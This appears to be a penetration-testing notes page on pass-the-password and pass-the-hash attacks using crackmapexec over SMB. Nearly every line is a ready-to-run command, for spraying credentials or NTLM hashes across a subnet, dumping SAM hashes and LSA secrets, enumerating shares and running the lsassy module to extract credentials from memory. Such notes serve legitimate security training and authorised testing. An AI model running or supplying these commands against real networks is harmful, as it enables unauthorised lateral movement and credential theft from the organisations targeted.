---
description: Pass The Password/Pass the hash
---

# Pass Attacks

If we crack a pass or get to dump sam hashes ;then we are able to try the lateral movement

crackmapexec

```
crackmapexec smb <ip/ipblock ex=192.168.132.0/24> -u <user> -d <domain> -p <password>
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption><p>Example Output #Check for pwn3d</p></figcaption></figure>

Pass The hash Attack (NTLMV1 ONLY)

```
crackmapexec smb <ip/ipblock ex=192.168.132.0/24> -u <user> -H <hash>
```

```
crackmapexec smb <ip/ipblock ex=192.168.132.0/24> -u <user> -H <hash> --local-auth
```

This help to do local auth and dump sam hashes for us

```
crackmapexec smb <ip/ipblock ex=192.168.132.0/24> -u <user> -H <hash> --local-auth --sam
```

To enuerate the shares

```
crackmapexec smb <ip/ipblock ex=192.168.132.0/24> -u <user> -H <hash> --local-auth --shares
```

Dumping lsa

```
crackmapexec smb <ip/ipblock ex=192.168.132.0/24> -u <user> -H <hash> --local-auth --lsa
```

Using Modules&#x20;

```
crackmapexec smb <ip/ipblock ex=192.168.132.0/24> -u <user> -H <hash> --local-auth -M <module name>
```

```
crackmapexec smb <ip/ipblock ex=192.168.132.0/24> -u <user> -H <hash> --local-auth -M lssasy
```

crack map exec database;run

```
cmedb
```

then u get into an data base

type `help` for more info&#x20;
